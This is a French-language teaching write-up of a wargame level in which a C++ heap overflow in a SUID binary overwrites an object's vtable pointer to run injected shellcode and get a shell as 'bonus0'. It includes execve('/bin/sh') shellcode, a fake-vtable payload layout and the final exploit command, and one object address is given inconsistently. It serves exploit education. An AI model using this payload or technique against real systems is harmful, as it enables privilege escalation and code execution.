# Level9 - README Pédagogique

## 🎯 Objectif
Exploiter un **heap buffer overflow en C++** pour corrompre la **vtable** d'un objet et rediriger l'exécution vers un **shellcode injecté**.

**Technique** : vtable Hijacking + Shellcode Injection

---

## 🔍 Reconnaissance

### Permissions du fichier
```bash
$ ls -l level9
-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
    ^
    └─ Bit SUID actif → s'exécute avec les droits de bonus0
```

### Tests comportementaux
```bash
$ ./level9
# Segmentation fault (sans argument)

$ ./level9 test
# (pas de sortie)

$ ./level9 $(python -c 'print "A"*200')
# Segmentation fault
```

**Observation** : Overflow détecté avec un long input.

---

## 🛠️ Analyse technique

### Code source (décompilé depuis Ghidra)
```cpp
#include <cstdlib>
#include <cstring>

class N {
private:
    int value;
    char annotation[100];

public:
    // Constructeur
    N(int n) {
        this->value = n;
    }

    // Méthode vulnérable
    void setAnnotation(char *str) {
        size_t len = strlen(str);
        memcpy(this->annotation, str, len);  // ⚠️ Pas de vérification !
    }

    // Opérateur surchargé (méthode virtuelle)
    virtual int operator+(N &other) {
        return this->value + other.value;
    }

    // Opérateur surchargé (méthode virtuelle)
    virtual int operator-(N &other) {
        return this->value - other.value;
    }
};

int main(int argc, char **argv)
{
    if (argc < 2) {
        _exit(1);
    }

    N *obj1 = new N(5);      // Alloue obj1 sur le heap
    N *obj2 = new N(6);      // Alloue obj2 sur le heap

    obj1->setAnnotation(argv[1]);  // ⚠️ Copie argv[1] sans limite

    (*obj2) + (*obj1);       // Appel de méthode virtuelle

    return 0;
}
```

**Observations critiques** :
1. Code **C++** avec classe et méthodes virtuelles
2. `memcpy()` sans vérification → heap overflow
3. Deux objets alloués consécutivement sur le heap
4. Appel de méthode virtuelle après l'overflow

---

## 💣 Vulnérabilité : Heap Overflow + vtable Hijacking

### 1. Le heap overflow

```cpp
void setAnnotation(char *str) {
    size_t len = strlen(str);
    memcpy(this->annotation, str, len);  // ⚠️ Pas de limite !
}
```

**Problème** : `annotation` fait 100 bytes, mais on peut copier `len` bytes (illimité).

### 2. Structure d'un objet C++ en mémoire

```
Objet N en mémoire :
┌─────────────────────────┐
│ vtable pointer (4 bytes)│ +0   ← Pointe vers la vtable
├─────────────────────────┤
│ annotation[100]         │ +4   ← Buffer
├─────────────────────────┤
│ value (4 bytes)         │ +104 ← Valeur (5 ou 6)
└─────────────────────────┘
Total : 108 bytes
```

**Note importante** : Le compilateur place le **vtable pointer en premier** dans tout objet avec méthodes virtuelles.

### 3. Layout du heap

```
Après new N(5) et new N(6) :

0x0804a008  obj1:
            [vtable ptr → vtable_N]
            [annotation[100]]
            [value = 5]

0x0804a078  obj2: (0x0804a008 + 108 + 8 header)
            [vtable ptr → vtable_N]  ← CIBLE !
            [annotation[100]]
            [value = 6]
```

**Distance** : 108 bytes (0x6c) entre obj1->annotation et obj2->vtable.

### 4. Qu'est-ce qu'une vtable ?

**vtable** (Virtual Table) = Tableau de pointeurs vers les méthodes virtuelles.

```
vtable_N (dans .rodata du binaire) :
┌────────────────────────┐
│ operator+() @ 0x8048xxx│ ← Première entrée
├────────────────────────┤
│ operator-() @ 0x8048yyy│ ← Deuxième entrée
└────────────────────────┘

Chaque objet N contient :
┌────────────────────────┐
│ vtable_ptr → vtable_N  │ ← Pointe vers la vtable
└────────────────────────┘
```

**Appel de méthode virtuelle** :
```cpp
obj2->operator+(obj1);

Assembleur :
mov eax, [obj2]      ; Lire vtable pointer
mov edx, [eax]       ; Lire première entrée (operator+)
call edx             ; Appeler la fonction
```

### 5. vtable Hijacking

**Si on écrase le vtable pointer de obj2** :

```
obj2->vtable = adresse_controlée

Quand operator+ est appelé :
1. Lit obj2->vtable → notre adresse
2. Lit première entrée → notre shellcode
3. call shellcode → Exécution détournée ! ✅
```

---

## 🔑 Concepts clés

### 1. C++ vs C

| | C | C++ |
|---|---|---|
| **Structures** | `struct` sans méthodes | `class` avec méthodes |
| **Allocation** | `malloc()` | `new` (appelle constructeur) |
| **Polymorphisme** | Pointeurs de fonctions | vtables |
| **Overhead** | Minimal | vtable pointer (4 bytes) |

### 2. Méthodes virtuelles

**Définition** : Méthode dont l'implémentation est résolue à l'exécution (polymorphisme).

```cpp
class Base {
    virtual void foo() { ... }  // Méthode virtuelle
};

class Derived : public Base {
    void foo() override { ... }
};

Base *ptr = new Derived();
ptr->foo();  // Appelle Derived::foo() grâce à la vtable !
```

**Sans `virtual`** : Résolution à la compilation (statique).
**Avec `virtual`** : Résolution à l'exécution (dynamique via vtable).

### 3. Pourquoi le vtable pointer est en premier ?

**Convention ABI (Application Binary Interface)** :
- Le compilateur place toujours le vtable pointer en **offset 0**
- Permet un accès rapide : `mov eax, [this]`
- Standard sur toutes les plateformes

### 4. Shellcode

**Définition** : Code machine injecté pour exécuter une commande.

**Shellcode utilisé (28 bytes)** :
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

**Ce qu'il fait** : `execve("/bin/sh", NULL, NULL)` puis `exit(0)`

---

## 🚀 Construction du payload

### Étape 1 : Comprendre le layout

```
obj1 = 0x0804a008
obj1->annotation = obj1 + 4 = 0x0804a00c  ← setAnnotation écrit ici

obj2 = 0x0804a078
obj2->vtable = obj2 + 0 = 0x0804a078       ← Cible à écraser

Distance : 0x0804a078 - 0x0804a00c = 0x6c = 108 bytes
```

### Étape 2 : Structure du payload

```
[Fausse vtable: 4 bytes] + [Shellcode: 28 bytes] + [Padding: 76 bytes] + [Adresse vtable: 4 bytes]
```

**Total** : 4 + 28 + 76 + 4 = 112 bytes

### Étape 3 : Composants détaillés

#### [1] Fausse vtable (4 bytes)
```
Adresse : 0x0804a010 (adresse du shellcode)
Little-endian : \x10\xa0\x04\x08

Placée à obj1 + 4 = 0x0804a00c
```

**Rôle** : Première entrée de notre fausse vtable, pointe vers le shellcode.

#### [2] Shellcode (28 bytes)
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80

Placé à obj1 + 8 = 0x0804a010
```

**Code assembleur** :
```asm
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov ecx, eax
mov edx, eax
mov al, 0x0b
int 0x80        ; execve("/bin/sh", NULL, NULL)
xor eax, eax
inc eax
int 0x80        ; exit(0)
```

#### [3] Padding (76 bytes)
```
"A" * 76

Calcul : 108 (distance) - 4 (fausse vtable) - 28 (shellcode) = 76
```

**Rôle** : Remplir l'espace jusqu'à obj2->vtable.

#### [4] Adresse de la fausse vtable (4 bytes)
```
Adresse : 0x0804a00c (début de notre payload)
Little-endian : \x0c\xa0\x04\x08

Écrase obj2->vtable
```

**Rôle** : Remplace le vtable pointer de obj2 par notre fausse vtable.

### Commande finale

```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*76 + "\x0c\xa0\x04\x08"')
```

---

## 🔄 Déroulement de l'exploitation

```
1. new N(5)
   → obj1 alloué à 0x0804a008

2. new N(6)
   → obj2 alloué à 0x0804a074

3. setAnnotation(argv[1])
   → Copie notre payload depuis obj1 + 4 (0x0804a00c)
   
   Heap après overflow :
   0x0804a00c: [0x0804a010]           ← Fausse vtable
   0x0804a010: [shellcode 28 bytes]  ← Notre code
   0x0804a02c: [AAAA... 76 bytes]    ← Padding
   0x0804a078: [0x0804a00c]           ← obj2->vtable écrasé !

4. (*obj2) + (*obj1)
   → Appel de operator+
   
   Assembleur :
   mov eax, [0x0804a078]   ; eax = 0x0804a00c (fausse vtable)
   mov edx, [eax]          ; edx = 0x0804a010 (shellcode)
   call edx                ; Exécute le shellcode ! ✅

5. Shellcode
   → execve("/bin/sh")
   → Shell obtenu avec les droits de bonus0 ! 🎉
```

---

## 📝 Classification

**Type de vulnérabilité** :
- **CWE-122** : Heap-based Buffer Overflow
- **CWE-119** : Improper Restriction of Operations within Bounds
- **CWE-250** : Execution with Unnecessary Privileges (SUID)

**Technique d'exploitation** :
- **vtable Hijacking** : Corruption de table virtuelle C++
- **Shellcode Injection** : Injection et exécution de code

---

## 🎓 Résumé

1. **Vulnérabilité** : `memcpy()` sans limite dans setAnnotation()
2. **Cible** : vtable pointer de obj2
3. **Technique** : Overflow obj1 → écrase vtable de obj2
4. **Payload** : Fausse vtable + shellcode + padding + adresse
5. **Résultat** : operator+ → shellcode → /bin/sh

---

## 🔐 Différences avec les niveaux précédents

| | Level6 | Level9 |
|---|---|---|
| **Langage** | C | C++ |
| **Cible** | Function pointer | vtable pointer |
| **Indirection** | Simple (func_ptr → fonction) | Double (vtable → entrée → fonction) |
| **Code injecté** | Non (fonction existante) | Oui (shellcode) |
| **Complexité** | Moyenne | Élevée |

**Level9 est unique** : Premier niveau en C++ avec exploitation de vtable.